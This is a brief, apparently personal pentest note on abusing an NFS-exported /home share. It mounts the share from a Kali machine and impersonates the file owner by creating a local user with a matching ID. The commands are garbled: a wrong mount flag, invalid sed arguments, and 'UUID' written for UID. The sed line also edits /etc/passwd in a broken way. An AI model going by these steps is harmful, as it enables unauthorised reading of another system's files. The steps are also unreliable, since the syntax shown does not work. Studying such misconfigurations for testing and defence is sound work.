NFS with different user permission

This case -- /home is being shared, and can be accessed by mounting it on our kali machine.

To do so:

> mkdir home;
> 
> sudo mount -I nolock $IP/home ~/home/;

<ins>**<ins>-nolock will disable file locking</ins>**</ins>

If we try to view files within that mounted folder, there won't be any permissions granted

What we can do is to replicate the user by creating a user with the same UUID, su to that user and access the file

> Sudo adduser pwn; sudo sed 0u 0e 's/$Created\_UUID/$permission\_UUID/g' /etc/passwd; su pwn; cat $file
